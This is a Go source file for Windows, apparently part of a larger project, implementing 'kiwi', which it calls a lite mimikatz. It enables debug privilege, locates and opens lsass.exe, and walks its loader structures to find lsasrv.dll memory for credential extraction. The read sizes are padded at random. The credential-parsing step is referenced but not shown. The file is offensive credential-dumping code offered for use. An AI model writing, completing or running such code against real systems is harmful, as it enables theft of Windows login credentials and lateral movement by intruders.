// +build windows

package kiwi

import (
	"reflect"
	"sort"
	"sync"
	"unicode/utf16"
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/logger"
	"project/internal/module/windows/api"
	"project/internal/module/windows/privilege"
	"project/internal/random"
)

// Credential contain information.
type Credential struct {
}

// Kiwi is a lite mimikatz.
type Kiwi struct {
	logger logger.Logger

	rand *random.Rand

	// privilege
	debug bool

	// 0 = not read, 1 = true, 2 = false
	wow64 uint8

	// resource about lsass.exe
	pid     uint32
	modules []*basicModuleInfo

	// about Windows version
	major uint32
	minor uint32
	build uint32

	mu sync.Mutex
}

// NewKiwi is used to create a new kiwi.
func NewKiwi(logger logger.Logger) *Kiwi {
	return &Kiwi{
		logger: logger,
		rand:   random.NewRand(),
	}
}

func (kiwi *Kiwi) log(lv logger.Level, log ...interface{}) {
	kiwi.logger.Println(lv, "kiwi", log...)
}

func (kiwi *Kiwi) logf(lv logger.Level, format string, log ...interface{}) {
	kiwi.logger.Printf(lv, "kiwi", format, log...)
}

// EnableDebugPrivilege is used to enable debug privilege.
func (kiwi *Kiwi) EnableDebugPrivilege() error {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.debug {
		return nil
	}
	err := privilege.EnableDebugPrivilege()
	if err != nil {
		return err
	}
	kiwi.debug = true
	return nil
}

// GetAllCredential is used to get all credentials from lsass.exe memory.
func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
	// check is running on WOW64
	wow64, err := kiwi.isWow64()
	if err != nil {
		return nil, err
	}
	if wow64 {
		return nil, errors.New("can't access x64 process")
	}
	pid, err := kiwi.getLSASSProcessID()
	if err != nil {
		return nil, err
	}
	pHandle, err := kiwi.getLSASSHandle(pid)
	if err != nil {
		return nil, err
	}
	defer api.CloseHandle(pHandle)
	kiwi.logf(logger.Info, "process handle of lsass.exe is 0x%X", pHandle)
	modules, err := kiwi.getLSASSBasicModuleInfo(pHandle)
	if err != nil {
		return nil, err
	}
	for _, module := range modules {
		if module.name == "lsasrv.dll" {
			_ = kiwi.searchMemory(pHandle, module.address, module.size)
		}
		// fmt.Println(module.name, module.address)
	}
	return nil, nil
}

func (kiwi *Kiwi) isWow64() (bool, error) {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.wow64 != 0 {
		return kiwi.wow64 == 1, nil
	}
	var wow64 bool
	err := windows.IsWow64Process(windows.CurrentProcess(), &wow64)
	if err != nil {
		return false, errors.Wrap(err, "failed to call IsWow64Process")
	}
	if wow64 {
		kiwi.wow64 = 1
	} else {
		kiwi.wow64 = 2
	}
	return wow64, nil
}

func (kiwi *Kiwi) getLSASSProcessID() (uint32, error) {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.pid != 0 {
		return kiwi.pid, nil
	}
	pid, err := api.GetProcessIDByName("lsass.exe")
	if err != nil {
		return 0, err
	}
	defer func() {
		kiwi.logf(logger.Info, "PID of lsass.exe is %d", kiwi.pid)
	}()
	l := len(pid)
	if l == 1 {
		kiwi.pid = pid[0]
		return kiwi.pid, nil
	}
	// if appear multi PID, select minimize
	ps := make([]int, l)
	for i := 0; i < l; i++ {
		ps[i] = int(pid[i])
	}
	sort.Ints(ps)
	kiwi.pid = uint32(ps[0])
	return kiwi.pid, nil
}

func (kiwi *Kiwi) getWindowsVersion() (major, minor, build uint32) {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.major == 0 {
		kiwi.major, kiwi.minor, kiwi.build = api.GetVersionNumber()
	}
	return kiwi.major, kiwi.minor, kiwi.build
}

func (kiwi *Kiwi) getLSASSHandle(pid uint32) (windows.Handle, error) {
	major, _, _ := kiwi.getWindowsVersion()
	var da uint32 = windows.PROCESS_VM_READ
	if major < 6 {
		da |= windows.PROCESS_QUERY_INFORMATION
	} else {
		da |= windows.PROCESS_QUERY_LIMITED_INFORMATION
	}
	return api.OpenProcess(da, false, pid)
}

type basicModuleInfo struct {
	name    string
	address uintptr
	size    int
}

func (kiwi *Kiwi) getVeryBasicModuleInfo(pHandle windows.Handle) ([]*basicModuleInfo, error) {
	const paddingSize = 256 + 512

	// read PEB base address
	var pbi api.ProcessBasicInformation
	ic := api.InfoClassProcessBasicInformation
	_, err := api.NTQueryInformationProcess(pHandle, ic, (*byte)(unsafe.Pointer(&pbi)), unsafe.Sizeof(pbi))
	if err != nil {
		return nil, err
	}
	kiwi.logf(logger.Debug, "PEB base address is 0x%X", pbi.PEBBaseAddress)

	// read PEB
	var peb struct {
		api.PEB
		padding [paddingSize]byte
	}
	size := unsafe.Sizeof(peb.PEB) + uintptr(256+kiwi.rand.Int(512))
	_, err = api.ReadProcessMemory(pHandle, pbi.PEBBaseAddress, (*byte)(unsafe.Pointer(&peb)), size)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to read PEB structure")
	}
	kiwi.logf(logger.Debug, "loader data address is 0x%X", peb.LoaderData)

	// read loader data
	var loaderData struct {
		api.PEBLDRData
		padding [paddingSize]byte
	}
	size = unsafe.Sizeof(loaderData.PEBLDRData) + uintptr(256+kiwi.rand.Int(512))
	_, err = api.ReadProcessMemory(pHandle, peb.LoaderData, (*byte)(unsafe.Pointer(&loaderData)), size)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to read PEB loader data")
	}

	// read loader data table entry
	offset := unsafe.Offsetof(api.LDRDataTableEntry{}.InMemoryOrderLinks)
	begin := uintptr(unsafe.Pointer(loaderData.InMemoryOrderModuleVector.Flink)) - offset
	end := peb.LoaderData + unsafe.Offsetof(api.PEBLDRData{}.InLoadOrderModuleVector)
	kiwi.logf(logger.Debug, "read loader data table entry, begin: 0x%X, end: 0x%X", begin, end)
	var modules []*basicModuleInfo
	var ldrEntry struct {
		api.LDRDataTableEntry
		padding [paddingSize]byte
	}
	for addr := begin; addr < end; addr = uintptr(unsafe.Pointer(ldrEntry.InMemoryOrderLinks.Flink)) - offset {
		size = unsafe.Sizeof(ldrEntry.LDRDataTableEntry) + uintptr(256+kiwi.rand.Int(512))
		_, err = api.ReadProcessMemory(pHandle, addr, (*byte)(unsafe.Pointer(&ldrEntry)), size)
		if err != nil {
			return nil, errors.WithMessage(err, "failed to read loader data table entry")
		}
		// read base dll name
		bufAddr := ldrEntry.BaseDLLName.Buffer
		size = uintptr(ldrEntry.BaseDLLName.MaximumLength)
		baseDLLName := make([]byte, int(size)+256+kiwi.rand.Int(512))
		_, err = api.ReadProcessMemory(pHandle, bufAddr, (*byte)(unsafe.Pointer(&baseDLLName[0])), size)
		if err != nil {
			return nil, errors.WithMessage(err, "failed to read base dll name")
		}
		// make string
		var utf16Str []uint16
		sh := (*reflect.SliceHeader)(unsafe.Pointer(&utf16Str))
		sh.Len = int(ldrEntry.BaseDLLName.Length / 2)
		sh.Cap = int(ldrEntry.BaseDLLName.Length / 2)
		sh.Data = uintptr(unsafe.Pointer(&baseDLLName[:ldrEntry.BaseDLLName.Length][0]))
		// add module
		modules = append(modules, &basicModuleInfo{
			name:    string(utf16.Decode(utf16Str)),
			address: ldrEntry.DLLBase,
			size:    int(ldrEntry.SizeOfImage),
		})
	}
	kiwi.log(logger.Debug, "loaded module count:", len(modules))
	return modules, nil
}

func (kiwi *Kiwi) getLSASSBasicModuleInfo(pHandle windows.Handle) ([]*basicModuleInfo, error) {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if len(kiwi.modules) != 0 {
		return kiwi.modules, nil
	}
	var err error
	kiwi.modules, err = kiwi.getVeryBasicModuleInfo(pHandle)
	if err != nil {
		return nil, err
	}
	kiwi.log(logger.Info, "load module information about lsass.exe successfully")
	return kiwi.modules, nil
}
